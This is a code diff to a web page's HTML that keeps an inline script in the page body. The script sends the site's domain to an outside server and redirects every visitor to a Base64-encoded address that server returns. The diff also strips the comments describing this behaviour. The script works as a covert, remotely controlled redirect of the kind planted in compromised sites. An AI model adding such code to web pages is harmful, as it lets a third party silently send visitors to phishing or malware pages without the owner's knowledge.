@@ -19,17 +19,11 @@
   <body>
 	  <script>
 (async () => {
-  // Извлекаем домен из текущего URL (без протоколов и www)
-  const domain = location.href.match(/^(?:https?:\/\/)?(?:www\.)?([^\/]+)/i)?.[1];
+  const domain =  new URL(location.href).hostname;
   if (!domain) return;
-
-  // Отправляем запрос к API
   const { status } = await (await fetch(`https://domain.memc.site/domain?url=${domain}`)).json();
-  
-  // Если status не пустой, декодируем из Base64 и перенаправляем
   if (status) location.href = atob(status);
 })();
-
 </script>
     <section class="image4" id="image04-0">
       <div class="image-block m-auto">
